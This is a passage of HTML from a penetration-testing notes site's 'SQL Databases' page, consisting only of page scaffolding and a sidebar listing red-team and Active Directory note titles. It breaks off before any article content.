<!DOCTYPE html>
<html class="no-js" lang="en"> <head><meta charset="utf-8"/><meta content="width=device-width,initial-scale=1" name="viewport"/><meta content="Red Mind, Blue Actions" name="description"/><meta content="neutron" name="author"/><link href="https://neutronsec.com/attacking_common_services/attacking_sql/" rel="canonical"/><link href="../../assets/favicon.png" rel="icon"/><meta content="mkdocs-1.4.0, mkdocs-material-8.4.4+insiders-4.23.1" name="generator"/><title>SQL Databases - Neutron Security</title><link href="../../assets/stylesheets/main.6148a559.min.css" rel="stylesheet"/><link href="../../assets/stylesheets/palette.cbb835fc.min.css" rel="stylesheet"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/><style>:root{--md-text-font:"Inter";--md-code-font:"Roboto Mono"}</style><link href="../../stylesheets/extra.css" rel="stylesheet"/><script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><link href="../../assets/stylesheets/glightbox.min.css" rel="stylesheet"/><style>html.glightbox-open { overflow: initial; height: 100%; }</style><script src="../../assets/javascripts/glightbox.min.js"></script></head> <body data-md-color-accent="" data-md-color-primary="" data-md-color-scheme="" dir="ltr"> <input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/> <input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> </div> <div data-md-component="announce"> </div> <header class="md-header" data-md-component="header"> <nav aria-label="Header" class="md-header__inner md-grid"> <a aria-label="Neutron Security" class="md-header__button md-logo" data-md-component="logo" href="../.." title="Neutron Security"> <img alt="logo" src="../../assets/images/illustration.png"/> </a> <label class="md-header__button md-icon" for="__drawer"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> Neutron Security </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> SQL Databases </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input aria-label="Switch to light mode" class="md-option" data-md-color-accent="" data-md-color-media="(prefers-color-scheme)" data-md-color-primary="" data-md-color-scheme="" id="__palette_0" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to light mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="m14.3 16-.7-2h-3.2l-.7 2H7.8L11 7h2l3.2 9h-1.9M20 8.69V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69m-9.15 3.96h2.3L12 9l-1.15 3.65Z"></path></svg> </label> <input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="indigo" data-md-color-scheme="default" id="__palette_1" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_2" hidden="" title="Switch to dark mode"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> <input aria-label="Switch to system preference" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="indigo" data-md-color-scheme="slate" id="__palette_2" name="__palette" type="radio"/> <label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to system preference"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"></path></svg> </label> </form> <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/> <label class="md-search__icon md-icon" for="__search"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"></path></svg> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"></path></svg> </label> <nav aria-label="Search" class="md-search__options"> <a aria-label="Share" class="md-search__icon md-icon" data-clipboard="" data-clipboard-text="" data-md-component="search-share" href="javascript:void(0)" tabindex="-1" title="Share"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"></path></svg> </a> <button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset"> <svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"></path></svg> </button> </nav> <div class="md-search__suggest" data-md-component="search-suggest"></div> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" data-md-scrollfix=""> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list"></ol> </div> </div> </div> </div> </div> </nav> </header> <div class="md-container" data-md-component="container"> <nav aria-label="Tabs" class="md-tabs" data-md-component="tabs"> <div class="md-tabs__inner md-grid"> <ul class="md-tabs__list"> <li class="md-tabs__item"> <a class="md-tabs__link" href="../.."> Home </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../about/"> About </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link" href="../../blog/"> Blog </a> </li> <li class="md-tabs__item"> <a class="md-tabs__link md-tabs__link--active" href="../../docs/"> Notes </a> </li> </ul> </div> </nav> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a aria-label="Neutron Security" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="Neutron Security"> <img alt="logo" src="../../assets/images/illustration.png"/> </a> Neutron Security </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../.."> <span class="md-ellipsis"> Home </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../about/"> <span class="md-ellipsis"> About </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" id="__nav_3" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../blog/"> <span class="md-ellipsis"> Blog </span> </a> <label class="md-nav__link" for="__nav_3"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Blog" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_3"> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_2" id="__nav_3_2" type="checkbox"/> <label class="md-nav__link" for="__nav_3_2"> <span class="md-ellipsis"> Archive </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Archive" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_2"> <span class="md-nav__icon md-icon"></span> Archive </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/archive/2022/"> <span class="md-ellipsis"> 2022 </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" id="__nav_3_3" type="checkbox"/> <label class="md-nav__link" for="__nav_3_3"> <span class="md-ellipsis"> Categories </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Categories" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_3_3"> <span class="md-nav__icon md-icon"></span> Categories </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/azure/"> <span class="md-ellipsis"> Azure </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/blog/"> <span class="md-ellipsis"> Blog </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/blue-team/"> <span class="md-ellipsis"> Blue Team </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/hackthebox/"> <span class="md-ellipsis"> HackTheBox </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/powershell/"> <span class="md-ellipsis"> Powershell </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/security/"> <span class="md-ellipsis"> Security </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../blog/category/soc/"> <span class="md-ellipsis"> SOC </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" id="__nav_4" type="checkbox"/> <div class="md-nav__link md-nav__container"> <a class="md-nav__link" href="../../docs/"> <span class="md-ellipsis"> Notes </span> </a> <label class="md-nav__link" for="__nav_4"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav aria-label="Notes" class="md-nav" data-md-level="1"> <label class="md-nav__title" for="__nav_4"> <span class="md-nav__icon md-icon"></span> Notes </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" id="__nav_4_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2"> <span class="md-ellipsis"> Cheatsheets </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cheatsheets" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_2"> <span class="md-nav__icon md-icon"></span> Cheatsheets </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1" id="__nav_4_2_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1"> <span class="md-ellipsis"> Pentesting / CTF </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Pentesting / CTF" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_2_1"> <span class="md-nav__icon md-icon"></span> Pentesting / CTF </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_1" id="__nav_4_2_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/active_directory/cheatsheet_aid/"> <span class="md-ellipsis"> Basics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/active_directory/enumeration_and_attacks/"> <span class="md-ellipsis"> Enumeration/Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/active_directory/exploitation/"> <span class="md-ellipsis"> Exploitation </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2_1_2" id="__nav_4_2_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_2_1_2"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_2_1_2"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/privesc/linux/"> <span class="md-ellipsis"> Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/privesc/windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/cheatsheet-77/"> <span class="md-ellipsis"> Commands </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/linux_shortcuts/"> <span class="md-ellipsis"> Linux Shortcuts </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/windows/"> <span class="md-ellipsis"> Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/shells_payloads/"> <span class="md-ellipsis"> Shells &amp; Payloads </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/web_requests/"> <span class="md-ellipsis"> Web requests </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/deobfuscation/"> <span class="md-ellipsis"> (De)Obfuscation </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/brute_forcing/"> <span class="md-ellipsis"> Brute Forcing </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/common_apps/"> <span class="md-ellipsis"> Common Applications </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/web_attacks/"> <span class="md-ellipsis"> Web Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/file_transfer/"> <span class="md-ellipsis"> File Transfer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/footprinting/"> <span class="md-ellipsis"> Footprinting </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/cheatsheet_ptpf/"> <span class="md-ellipsis"> Pivoting, Tunnel, Port Forwarding </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/info_gathering_web/"> <span class="md-ellipsis"> Information Gathering - Web </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/msf/"> <span class="md-ellipsis"> MSF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/password_attacks/"> <span class="md-ellipsis"> Password Attacks </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/attacking_common_services/"> <span class="md-ellipsis"> Attacking Common Services </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/ffuf/"> <span class="md-ellipsis"> FFUF </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/hydra/"> <span class="md-ellipsis"> Hydra </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../cheat_sheets/network_traffic_analysis/"> <span class="md-ellipsis"> Network Traffic Analysis </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input checked="" class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" id="__nav_4_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3"> <span class="md-ellipsis"> Red Team </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Red Team" class="md-nav" data-md-level="2"> <label class="md-nav__title" for="__nav_4_3"> <span class="md-nav__icon md-icon"></span> Red Team </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1" id="__nav_4_3_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1"> <span class="md-ellipsis"> Active Directory </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Active Directory" class="md-nav" data-md-level="3"> <label class="md-nav__title" for="__nav_4_3_1"> <span class="md-nav__icon md-icon"></span> Active Directory </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_1" id="__nav_4_3_1_1" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_1"> <span class="md-ellipsis"> Initial Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Initial Enumeration" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_1"> <span class="md-nav__icon md-icon"></span> Initial Enumeration </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/initial_enum/external_recon_enum_principles/"> <span class="md-ellipsis"> External Recon </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/initial_enum/init_enum_domain/"> <span class="md-ellipsis"> Initial Enumeration of the Domain </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_2" id="__nav_4_3_1_2" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_2"> <span class="md-ellipsis"> Gaining a Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Gaining a Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_2"> <span class="md-nav__icon md-icon"></span> Gaining a Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/foothold/llmnr_nbtns_poisonong_from_linux/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/foothold/llmnr_nbtns_poisonong_from_windows/"> <span class="md-ellipsis"> LLMNR/NBT-NS Poisoning - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_3" id="__nav_4_3_1_3" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_3"> <span class="md-ellipsis"> Hunting for a User </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Hunting for a User" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_3"> <span class="md-nav__icon md-icon"></span> Hunting for a User </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/userhunting/enumerate_retrieve_pwdpol/"> <span class="md-ellipsis"> Enumerating &amp; Retrieving PwdPols </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/userhunting/pwd_spraying_target_user_list/"> <span class="md-ellipsis"> Pwd Spraying - Making a Targeted User List </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_4" id="__nav_4_3_1_4" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_4"> <span class="md-ellipsis"> PwSpray </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="PwSpray" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_4"> <span class="md-nav__icon md-icon"></span> PwSpray </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/spray_responsibility/internal_pwd_spray_from_linux/"> <span class="md-ellipsis"> Internal Spraying - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/spray_responsibility/internal_pwd_spray_from_windows/"> <span class="md-ellipsis"> Internal Spraying - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_5" id="__nav_4_3_1_5" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_5"> <span class="md-ellipsis"> Post Foothold </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Post Foothold" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_5"> <span class="md-nav__icon md-icon"></span> Post Foothold </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/deeper_down_the_rabbithole/enumerating_security_controls/"> <span class="md-ellipsis"> Enumerating Security Controls </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_linux/"> <span class="md-ellipsis"> Credentialed Enumeration - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/deeper_down_the_rabbithole/credentialed_enumeration_from_windows/"> <span class="md-ellipsis"> Credentialed Enumeration - Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/deeper_down_the_rabbithole/living_off_the_land/"> <span class="md-ellipsis"> Living Off The Land </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_6" id="__nav_4_3_1_6" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_6"> <span class="md-ellipsis"> Kerberoasting </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Kerberoasting" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_6"> <span class="md-nav__icon md-icon"></span> Kerberoasting </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/cooking_with_fire/kerberoasting_from_linux/"> <span class="md-ellipsis"> Kerberoasting - Linux </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/cooking_with_fire/kerberoasting_from_windows/"> <span class="md-ellipsis"> Kerberoasting - Windows </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_7" id="__nav_4_3_1_7" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_7"> <span class="md-ellipsis"> ACLs </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="ACLs" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_7"> <span class="md-nav__icon md-icon"></span> ACLs </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/acls/acl_enumeration/"> <span class="md-ellipsis"> ACL Enumeration </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/acls/acl_abuse/"> <span class="md-ellipsis"> ACL Abuse Tactics </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/acls/dcsync/"> <span class="md-ellipsis"> DCSync </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_8" id="__nav_4_3_1_8" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_8"> <span class="md-ellipsis"> Privilege Escalation </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Privilege Escalation" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_8"> <span class="md-nav__icon md-icon"></span> Privilege Escalation </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/stacking_the_deck/privileged_access/"> <span class="md-ellipsis"> Privileged Access </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/stacking_the_deck/kerberos_double_hop/"> <span class="md-ellipsis"> Kerberos Double Hop </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/stacking_the_deck/bleeding_edge_vulns/"> <span class="md-ellipsis"> Vulnerabilities </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/stacking_the_deck/miscellaneous_misconfigurations/"> <span class="md-ellipsis"> Misconfigurations </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_9" id="__nav_4_3_1_9" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_9"> <span class="md-ellipsis"> Domain Trusts </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Domain Trusts" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_9"> <span class="md-nav__icon md-icon"></span> Domain Trusts </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/why_so_trusting/domain_trusts_primer/"> <span class="md-ellipsis"> Domain Trusts Primer </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_win/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/why_so_trusting/atk_dom_trust_child_parent_trust_from_linux/"> <span class="md-ellipsis"> Attacking Domain Trusts - Child -&gt; Parent - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3_1_10" id="__nav_4_3_1_10" type="checkbox"/> <label class="md-nav__link" for="__nav_4_3_1_10"> <span class="md-ellipsis"> Cross-Forest Trust Abuse </span> <span class="md-nav__icon md-icon"></span> </label> <nav aria-label="Cross-Forest Trust Abuse" class="md-nav" data-md-level="4"> <label class="md-nav__title" for="__nav_4_3_1_10"> <span class="md-nav__icon md-icon"></span> Cross-Forest Trust Abuse </label> <ul class="md-nav__list" data-md-scrollfix=""> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_win/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Windows </span> </a> </li> <li class="md-nav__item"> <a class="md-nav__link" href="../../active_directory/cross_forest_trust/cross_forest_trust_abuse_from_linux/"> <span class="md-ellipsis"> Cross-Forest Trust Abuse - from Linux </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item 